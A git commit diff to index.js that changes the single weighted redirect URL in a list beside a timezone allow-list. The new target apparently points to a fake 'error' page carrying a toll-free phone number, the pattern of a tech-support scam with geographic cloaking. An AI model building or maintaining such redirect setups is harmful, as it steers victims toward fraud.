7267fe0ab55014957c5624a17802f2c731f1b85e
paalakash <palaksh452@gmail.com>
2026-06-26 06:39:50 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-prawn-app-3gsi9.ondigitalocean.app/werrx01USAHTML/?bcda=1800-875-524", weight: 1.0 }
+    { url: "https://goldfish-app-v7eka.ondigitalocean.app/werrx01USAHTML/?bcda=1800-875-524", weight: 1.0 }
 
 ];
 
